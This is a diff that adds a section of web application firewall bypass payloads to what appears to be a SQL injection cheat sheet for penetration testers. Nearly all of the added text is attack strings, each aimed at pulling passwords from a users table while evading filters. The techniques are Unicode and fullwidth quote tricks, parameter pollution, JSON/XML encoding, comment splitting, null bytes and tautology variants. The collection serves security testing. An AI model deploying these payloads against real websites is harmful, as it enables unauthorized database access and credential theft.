@@ -591,3 +591,47 @@ Bypass using keywords case insensitive or an equivalent operator.
 * [SQLi in INSERT worse than SELECT - Mathias Karlsson - February 14, 2017](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
 * [SQLi Optimization and Obfuscation Techniques - Roberto Salgado - 2013](https://web.archive.org/web/20221005232819/https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2013/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-Slides.pdf)
 * [The SQL Injection Knowledge base - Roberto Salgado - May 29, 2013](https://websec.ca/kb/sql_injection)
+
+## Advanced WAF Bypass Techniques
+
+### Unicode/UTF-8 Encoding Bypasses
+```sql
+-- Unicode normalization bypass
+SELECT%C2%A0*%C2%A0FROM%C2%A0users
+＇ OR ＇1＇=＇1  -- Fullwidth characters
+ʼ OR ʼ1ʼ=ʼ1    -- Modifier letter apostrophe
+```
+
+### HTTP Parameter Pollution
+```
+# Split payload across duplicate params
+?id=1&id=UNION&id=SELECT&id=password&id=FROM&id=users
+```
+
+### JSON/XML Encoding
+```json
+{"id": "1 UNION SELECT password FROM users"}
+```
+```xml
+<id>1 &#85;NION SELECT password FROM users</id>
+```
+
+### Comment Variations
+```sql
+1'/**/UNION/**/SELECT/**/password/**/FROM/**/users--
+1'/*!50000UNION*//*!50000SELECT*/password FROM users--
+1'/**/UN/**/ION/**/SE/**/LECT/**/password/**/FROM/**/users--
+```
+
+### Case Alternation with Null Bytes
+```sql
+1' uNiOn%00SeLeCt password FrOm users--
+1'%00UNION%00SELECT%00password%00FROM%00users--
+```
+
+### Scientific Notation Bypass
+```sql
+1'AND 1e0=1e0--
+1'AND 0x1=0x1--
+```
+
